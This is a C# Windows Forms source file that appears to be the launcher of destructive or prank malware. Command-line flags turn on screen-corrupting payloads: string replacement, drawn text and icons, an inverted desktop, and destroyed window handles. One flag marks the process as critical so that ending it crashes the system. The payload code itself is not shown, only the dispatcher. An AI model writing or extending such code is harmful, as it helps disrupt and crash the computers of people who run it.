namespace ezikbucur
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private readonly Payload p = new();

        private void Form1_Load(object sender, EventArgs e)
        {
            string[] args = Environment.GetCommandLineArgs();
            foreach (string arg in args)
            {
                switch (arg)
                {
                    case "-replace":
                        p.ReplaceStringsPayload = true;
                        break;
                    case "-text":
                        p.DrawStringPayload = true;
                        break;
                    case "-icon":
                        p.drawIconsPayload = true;
                        break;
                    case "-critical":
                        Protection.SetSelfAsCriticalProcess();
                        break;
                    case "-destroy":
                        p.DestroyWindowHandles();
                        break;
                    case "-desktop":
                        p.InvertDesktopPayload = true;
                        break;
                }
            }
        }

        private void logs_TextChanged(object sender, EventArgs e)
        {

        }
    }
}